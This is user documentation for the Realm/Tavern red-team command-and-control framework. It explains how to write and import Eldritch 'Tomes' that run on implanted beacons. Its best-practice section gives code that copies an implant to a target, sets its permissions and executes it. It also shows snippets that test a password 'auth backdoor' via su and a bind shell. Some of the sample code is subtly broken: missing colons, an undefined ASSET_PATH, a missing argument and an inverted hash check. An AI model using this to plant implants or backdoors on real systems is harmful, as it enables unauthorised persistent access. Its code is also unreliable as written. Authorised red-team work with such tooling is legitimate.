## Tomes

A [Tome](/user-guide/terminology#tome) is an [Eldritch](/user-guide/terminology#eldritch) package that can be run on one or more [Beacons](/user-guide/terminology#beacon). By default, Tavern includes several core [Tomes](/user-guide/terminology#tome) to get you started. Please take a few minutes to read through the options available to you now, and be sure to refer to them as reference when creating your own [Tomes](/user-guide/terminology#tome). If you're looking for information on how to run [Tomes](/user-guide/terminology#tome) and aren't quite ready to write your own, check out our [Getting Started guide](/user-guide/getting-started). Otherwise, adventure onwards, but with a word of warning. [Eldritch](/user-guide/terminology#eldritch) provides a useful abstraction for many offensive operations, however it is under heavy active development at this time and is subject to change. After the release of [Realm](https://github.com/spellshift/realm) version `1.0.0`, [Eldritch](/user-guide/terminology#eldritch) will follow [Semantic Versioning](https://semver.org/), to prevent [Tomes](/user-guide/terminology#tome) from failing when breaking changes are introduced. Until then however, the [Eldritch](/user-guide/terminology#eldritch) API may change. This rapid iteration will enable the language to more quickly reach maturity and ensure we provide the best possible design for operators, so thank you for your patience.

## Anatomy of a Tome

A [Tome](/user-guide/terminology#tome) has a well-defined structure consisting of three key components:

1. `metadata.yml`: This file serves as the [Tome's](/user-guide/terminology#tome) blueprint, containing essential information in YAML format. More information about this file can be found below in the [Tome Metadata section.](/user-guide/tomes#tome-metadata)

2. `main.eldritch`: This file is where the magic happens. It contains the [Eldritch](/user-guide/terminology#eldritch) code evaluated by the [Tome](/user-guide/terminology#tome). Testing your code with [Golem](/user-guide/golem) before running it in production is highly recommended, since it enables signficantly faster developer velocity.

3. `assets/` (optional): [Tomes](/user-guide/terminology#tome) have the capability to leverage additional resources stored externally. These assets, which may include data files, configuration settings, or other tools, are fetched using the implant's callback protocol (e.g. `gRPC`) using the [Eldritch Assets API](/user-guide/eldritch#assets). More information about these files can be found below in the [Tome Assets section.](/user-guide/tomes#tome-assets)

## Tome Metadata

The `metadata.yml` file specifies key information about a [Tome](/user-guide/terminology#tome):

| Name | Description | Required |
|------|-------------|----------|
| `name` | Display name of your [Tome](/user-guide/terminology#tome). | Yes |
| `description` | Provide a helpful description of functionality, for user's of your [Tome](/user-guide/terminology#tome). | Yes |
| `author` | Your name/handle, so you can get credit for your amazing work! | Yes |
| `tactic` | The relevant [MITRE ATT&CK tactic](https://attack.mitre.org/tactics/enterprise/) that best describes this [Tome](/user-guide/terminology#tome). Possible values include: `UNSPECIFIED`, `RECON`, `RESOURCE_DEVELOPMENT`, `INITIAL_ACCESS`, `EXECUTION`, `PERSISTENCE`, `PRIVILEGE_ESCALATION`, `DEFENSE_EVASION`, `CREDENTIAL_ACCESS`, `DISCOVERY`, `LATERAL_MOVEMENT`, `COLLECTION`,`COMMAND_AND_CONTROL`,`EXFILTRATION`, `IMPACT`. | Yes |
| `paramdefs` | A list of [parameters](/user-guide/tomes#tome-parameters) that users may provide to your [Tome](/user-guide/terminology#tome) when it is run. | No |

### Tome Parameters

Parameters are defined as a YAML list, but have their own additional properties:

| Name | Description | Required |
| `name` | Identifier used to access the parameter via the `input_params` global. | Yes |
| `label` | Display name of the parameter for users of the [Tome](/user-guide/terminology#tome). | Yes |
| `type` | Type of the parameter in [Eldritch](/user-guide/terminology#eldritch). Current values include: `string`. | Yes |
| `placeholder` | An example value displayed to users to help explain the parameter's purpose. | Yes |

#### Tome Parameter Example

```yaml
paramdefs:
  - name: path
    type: string
    label: File path
    placeholder: "/etc/open*"
```

#### Referencing Tome Parameters

If you've defined a parameter for your [Tome](/user-guide/terminology#tome), there's a good chance you'll want to use it. Luckily, [Eldritch](/user-guide/terminology#eldritch) makes this easy for you by providing a global `input_params` dictionary, which is populated with the parameter values provided to your [Tome](/user-guide/terminology#tome). To access a parameter, simply use the `paramdef` name (defined in `metadata.yml`). For example:

```python
def print_path_param():
  path = input_params["path"]
  print(path)
```

In the above example, our `metadata.yml` file would specify a value for `paramdefs` with `name: path` set. Then when accessing `input_params["path"]` the string value provided to the [Tome](/user-guide/terminology#tome) is returned.

### Tome Metadata Example

```yaml
name: List files
description: List the files and directories found at the path. Supports basic glob functionality. Does not glob more than one level.
author: hulto
tactic: RECON
paramdefs:
  - name: path
    type: string
    label: File path
    placeholder: "/etc/open*"
```

For more examples, please see Tavern's first party supported [Tomes](https://github.com/spellshift/realm/tree/main/tavern/tomes).

### Tome Assets

Assets are files that can be made available to your [Tome](/user-guide/terminology#tome) if required. These assets are lazy-loaded by [Agents](/user-guide/terminology#agent), so if they are unused they will not increase the on-the-wire size of the payload sent to an [Agent](/user-guide/terminology#agent). This means it's encouraged to include multiple versions of files, for example `myimplant-linux` and `myimplant.exe`. This enables [Tomes](/user-guide/terminology#tome) to be cross-platform, reducing the need for redundant [Tomes](/user-guide/terminology#tome).

#### Referencing Tome Assets

When using the [Eldritch Assets API](/user-guide/eldritch#assets), these assets are referenced based on the **name of the directory** your `main.eldritch` file is in (which may be the same as your [Tome's](/user-guide/terminology#tome) name). For example, with an asset `imix.exe` located in `/mytome/assets/imix.exe` (and where my `metadata.yml` might specify a name of "My Tome"), the correct identifier to reference this asset is `mytome/assets/imix.exe` (no leading `/`). On all platforms (even on Windows systems), use `/` as the path separator when referencing these assets.

Below is the directory structure used in this example:

```text
mytome/
      /main.eldritch
      /metadata.yml
      /assets/
             /imix.exe
             /imix-linux
```

## Importing Tomes from Git

### Create Git Repository

First, create a git repository and commit your [Tomes](/user-guide/terminology#tome) there. Realm primarily supports using GitHub private repositories (or public if suitable), but you may use any git hosting service at your own risk. If you forget to include `main.eldritch` or `metadata.yml` files, your [Tomes](/user-guide/terminology#tome) **will not be imported**. Be sure to include a `main.eldritch` and `metadata.yml` in your [Tome's](/user-guide/terminology#tome) root directory.

Additionally, copy the URL to the repository, which you will need in the next step. **For private repositories, only SSH is supported.**

![Git Repo Copy](/assets/img/user-guide/tomes/git-repo-copy.png)

### Import Tome Repository

Next, navigate to the "Tomes" page and select "Import tome repository"

![Tavern Tomes Page](/assets/img/user-guide/tomes/tomes-page.png)

Then, enter the repository URL copied from the previous step and click "Save Link".

![Import Tomes](/assets/img/user-guide/tomes/import-tomes.png)

### Git Repository Keys

For private repositories, Tavern will need permission to clone the repository. To enable this, copy the provided SSH public key and add it to your repository. For public repositories, you may skip this step.

![Import Tomes Pubkey](/assets/img/user-guide/tomes/import-tomes-pubkey.png)

On GitHub, you can easily accomplish this by adding Tavern's public key for the repository to the "Deploy Keys" setting of your repository.

![GitHub Deploy Keys](/assets/img/user-guide/tomes/github-deploy-keys.png)

### Import Tomes

Now, all that's left is to click "Import tomes". If all goes well, your [Tomes](/user-guide/terminology#tome) will be added to Tavern and will be displayed on the view. If [Tomes](/user-guide/terminology#tome) are missing, be sure each [Tome](/user-guide/terminology#tome)  has a valid `metadata.yml` and `main.eldritch` file in the [Tome](/user-guide/terminology#tome) root directory.

Anytime you need to re-import your [Tomes](/user-guide/terminology#tome) (for example, after an update), you may navigate to the "Tomes" page and click "Refetch tomes".

## Tome writing best practices

Writing tomes will always be specific to your use case. Different teams, different projects will prioritize different things. In this guide we'll prioritize reliability and safety at the expense of OPSEC.

OPSEC considerations will tend towards avoiding calls to `shell` and `exec` instead using native functions to accomplish the function.

In some situations you may also wish to avoid testing on target if that's the case you should test throughly off target before launching.

If you test off target you can leverage native functions like [`sys.get_os`](/user-guide/eldritch#sysget_os) to ensure that your tome only runs against targets it's been tested on.

### Example

Copy and run an asset in a safe and idempotant way

```python
IMPLANT_ASSET_PATH = "tome_name/assets/implant"
ASSET_SHA1SUM = "44e1bf82832580c11de07f57254bd4af837b658e"

def pre_flight(dest_bin_path):
    ## Testing

    # Note that we're using multiple returns instead of
    # nesting if statements. This style is to ensule 
    # line of sight readability when reviewing code.
    if not sys.is_linux():
      print("[error] tome only supports linux")
      return False
    
    cur_user = sys.get_user()
    if cur_user['euid']['uid'] != 0:
      print(f"[error] tome must be run as root / uid 0 not {cur_user}")
      return False

    # Validate the destination directory exists
    if not file.is_dir(file.parent_dir(dest_bin_path)):
      print(f"[error] path {dest_bin_path} parent isn't a directory")
      return False

    if file.is_file(dest_bin_path):
      print(f"[error] path {dest_bin_path} already exists")
      return False

    does_chmod_exist = sys.shell(f"command -v chmod")
    if does_chmod_exist['status'] != 0:
        print(f"[error] tome requires `chmod` be available in PATH")
        return False

    return True


def deploy_asset(asset_path, dest, asset_hash):
  if file.is_file(asset_path):
    if crypto.hash_file(asset_path, "SHA1") != asset_hash:
      print(f"{dest} file already exists and is good")
      return True
  
  pdir = file.parent_dir(dest)
  if not file.is_dir(pdir):
      print(f"{pdir} isn't a dir aborting")
      return False
  
  asset.copy(asset_path, dest)
  return True

def set_perms(dest, perms):
  cur_perms = sys.shell(f"stat -f %A {dest}")
  if cur_perms['status'] == 0:
    if cur_perms['stdout'].strip() == perms:
      print(f"dest perms already set")
      return True

  res = sys.shell(f"chmod {perms} {dest}")
  print(f"modified perms of {dest}")
  pprint(res)
  if res['status'] == 0
    return True
  
  print(f"failed to set perms {perms} on {dest}")
  return False

def execute_once(dest):
  for p in process.list():
    if p['path'] == dest
      print(f"process {dest} is already running")
      pprint(p)
      return True

  res = sys.exec(dest, [], True)

  for p in process.list():
    if p['path'] == dest
      print(f"process {dest} is now running")
      pprint(p)
      return True

  return False

def cleanup(dest):
  if file.is_file(dest):
    print(f"cleaning up {dest}")
    file.remove(dest)
  

def main(dest_file_path):
  if not pre_flight():
    cleanup(dest_file_path)
    return
  if not deploy_asset(ASSET_PATH, dest_file_path, ASSET_SHA1SUM):
    cleanup(dest_file_path)
    return
  if not set_perms(dest_file_path, "755"):
    cleanup(dest_file_path)
    return
  execute_once(dest_file_path)


main(input_params['DEST_FILE_PATH'])
```

### Passing input
Tomes have an inherent global variable `input_params` that defines variables passed from the UI.
These are defined in your `metadata.yml` file.
Best practice is to pass these into your `main` function and sub functions to keep them reusable.
There is currently no way to define `input_params` during golem run time so if you're using golem to test tomes you may need to manually define them. Eg.

```python
input_params = {}
input_params['DEST_FILE_PATH'] = "/bin/imix"

main(input_params['DEST_FILE_PATH'])
```

### Fail early
Before modifying anything on Target or loading assets validate that the tome you're building will run as expected.
This avoids artifacts being left on disk if something fails and also provides verbose feedback in the event of an error to reduce trouble shooting time.

Common things to validate:
- Operating systems - all tomes are cross platform so it's up to the tome developer to fail if run on an unsupported OS
- Check parent directory exists using [`fileparent_dir`](/user-guide/eldritch#fileparent_dir) 
- User permissions
- Required dependencies or LOLBINs

**Note on `eprint`: eprint has bugs causing tomes to exit prematurely. Currently best practice is to avoid using it.**

### Backup and Test
If you need to modify configuration that might cause breaking changes to the system.
It's recommended that you create a backup, modify the config, and validate your change.
If something fails during validation replace the original config.

This might look like:
```python
file.copy(config_path, f"{config_path}.bak")

if not end_to_end_test():
    print("[error] end to end test failed cleaning up")
    file.remove(config_path)
    file.moveto(f"{config_path}.bak", config_path)
    return

file.remove(f"{config_path}.bak")
```

End to end test can validate the backdoor - if possible validate normal system functionality.

```python
# Auth backdoor - drop to a user account or `nobody` and then auth to a user account
sys.shell(f"echo -e '{password}\n{password}\n' | su {user} -c 'su {user} -c id'")

# Bind shell - check against localhost
res = sys.shell(f"{shell_client} 127.0.0.1 id")
```


### Idempotence
In many situations especially when deploying persistance you'll want to ensure that running a tome twice won't cause issues.
The best way to handle this is to when possible check the current state of the resource you're about to modify.

This often takes the shape of running validation before and after taking an action.
In the same way during manual operation you might check if a file is on disk and the right size you can automate that with eldritch.

Things to keep in mind:
- Does the file hash match?
- Do the permissions match?
- Is the process already running?
- Is the configuration already set?
